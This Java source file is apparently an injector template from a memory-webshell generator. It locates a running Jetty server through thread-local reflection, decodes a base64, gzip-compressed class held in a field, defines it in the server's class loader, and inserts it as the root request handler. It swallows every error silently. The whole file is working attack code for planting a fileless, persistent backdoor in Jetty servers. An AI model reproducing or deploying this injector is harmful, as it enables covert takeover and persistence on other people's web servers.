package org.leo.jmg.mem.injectortpl.jetty;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/** Jetty 7-11 Server 根 Handler 挂载器。 */
public class JettyHandlerInjector {
    private static String shellClassName;
    private static String shellClass;
    private static boolean ok;

    public JettyHandlerInjector() {
        if (ok) return;
        try {
            Object server = getServer();
            if (server != null) inject(server, getShell(server));
        } catch (Throwable ignored) {
        } finally {
            ok = true;
            shellClassName = null;
            shellClass = null;
        }
    }

    public void inject(Object server, Object handler) throws Exception {
        Object current = getFieldValue(server, "_handler");
        if (isInstalled(current)) return;

        validateHandler(handler);
        setFieldValue(handler, "nextHandler", current);
        try {
            setFieldValue(handler, "_server", server);
        } catch (Throwable ignored) {
        }
        setFieldValue(server, "_handler", handler);

        // Jetty 6 容器生命周期；保留反射分支以兼容早期 7.x 的容器实现。
        try {
            Object container = invokeMethod(server, "getContainer", null, null);
            invokeMethod(container, "addBean", new Class[]{Object.class},
                    new Object[]{handler});
        } catch (Throwable ignored) {
        }
        // Jetty 7-11 ContainerLifeCycle。
        try {
            invokeMethod(server, "addBean",
                    new Class[]{Object.class, Boolean.TYPE},
                    new Object[]{handler, Boolean.TRUE});
        } catch (Throwable ignored) {
        }
    }

    private boolean isInstalled(Object handler) {
        Set<Object> visited = new HashSet<Object>();
        Object current = handler;
        while (current != null && visited.add(current)) {
            if (current.getClass().getName().equals(shellClassName)) return true;
            try {
                current = getFieldValue(current, "nextHandler");
            } catch (Throwable ignored) {
                return false;
            }
        }
        return false;
    }

    private void validateHandler(Object handler) throws Exception {
        Method[] methods = handler.getClass().getMethods();
        for (int i = 0; i < methods.length; i++) {
            Method method = methods[i];
            if ("handle".equals(method.getName())
                    && method.getParameterTypes().length == 4) return;
        }
        throw new NoSuchMethodException("Jetty handle(String,Request,Request,Response)");
    }

    /** 从请求线程的 HttpConnection / Connector 找到 Jetty Server。 */
    private Object getServer() throws Exception {
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            try {
                Object table = getFieldValue(getFieldValue(thread, "threadLocals"), "table");
                for (int i = 0; i < Array.getLength(table); i++) {
                    Object entry = Array.get(table, i);
                    if (entry == null) continue;
                    Object value = getFieldValue(entry, "value");
                    if (value == null) continue;
                    String name = value.getClass().getName();
                    if (name.contains("HttpConnection")
                            || name.contains("SelectChannelConnector")) {
                        Object connector = invokeMethod(value, "getConnector", null, null);
                        Object server = invokeMethod(connector, "getServer", null, null);
                        if (server != null) return server;
                    }
                }
            } catch (Throwable ignored) {
            }
        }
        return null;
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader loader = context.getClass().getClassLoader();
        Class clazz;
        try {
            clazz = Class.forName(shellClassName, true, loader);
        } catch (ClassNotFoundException ignored) {
            byte[] bytes = gzipDecompress(decodeBase64(shellClass));
            Method defineClass = ClassLoader.class.getDeclaredMethod(
                    "defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);
            clazz = (Class) defineClass.invoke(loader, bytes,
                    Integer.valueOf(0), Integer.valueOf(bytes.length));
        }
        return clazz.newInstance();
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String value) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64")
                    .getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class)
                    .invoke(decoder, value);
        } catch (Exception ignored) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class)
                    .invoke(decoder, value);
        }
    }

    public static byte[] gzipDecompress(byte[] compressed) throws IOException {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        GZIPInputStream gzip = new GZIPInputStream(new ByteArrayInputStream(compressed));
        try {
            byte[] block = new byte[4096];
            int read;
            while ((read = gzip.read(block)) > 0) output.write(block, 0, read);
            return output.toByteArray();
        } finally {
            gzip.close();
            output.close();
        }
    }

    public static Field getField(Object target, String name) throws Exception {
        Class type = target.getClass();
        while (type != null && type != Object.class) {
            try {
                return type.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {
                type = type.getSuperclass();
            }
        }
        throw new NoSuchFieldException(name);
    }

    public static Object getFieldValue(Object target, String name) throws Exception {
        Field field = getField(target, name);
        field.setAccessible(true);
        return field.get(target);
    }

    public static void setFieldValue(Object target, String name, Object value) throws Exception {
        Field field = getField(target, name);
        field.setAccessible(true);
        field.set(target, value);
    }

    public static Object invokeMethod(Object target, String name,
                                      Class[] parameterTypes, Object[] arguments) throws Exception {
        Class type = target instanceof Class ? (Class) target : target.getClass();
        Method method = null;
        while (type != null && method == null) {
            try {
                method = type.getDeclaredMethod(name,
                        parameterTypes == null ? new Class[0] : parameterTypes);
            } catch (NoSuchMethodException ignored) {
                type = type.getSuperclass();
            }
        }
        if (method == null) throw new NoSuchMethodException(name);
        method.setAccessible(true);
        return method.invoke(target instanceof Class ? null : target,
                arguments == null ? new Object[0] : arguments);
    }
}
